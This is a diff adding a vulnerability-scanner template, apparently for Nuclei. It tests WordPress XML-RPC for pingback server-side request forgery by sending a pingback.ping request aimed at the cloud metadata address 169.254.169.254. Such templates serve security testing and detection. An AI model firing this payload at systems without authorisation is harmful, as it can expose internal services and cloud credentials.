@@ -1,0 +1,38 @@
+id: whai-wp-xmlrpc-pingback
+
+info:
+  name: WordPress XML-RPC Pingback SSRF
+  author: whitehat-ai
+  severity: high
+  description: Tests WP XML-RPC for pingback SSRF
+  tags: wordpress,ssrf,xmlrpc,high
+  classification:
+    cwe-id: CWE-918
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/xmlrpc.php"
+
+    headers:
+      Content-Type: application/xml
+
+    body: |
+      <?xml version="1.0"?>
+      <methodCall>
+        <methodName>pingback.ping</methodName>
+        <params>
+          <param><value><string>http://169.254.169.254/</string></value></param>
+          <param><value><string>{{BaseURL}}/</string></value></param>
+        </params>
+      </methodCall>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "faultCode"
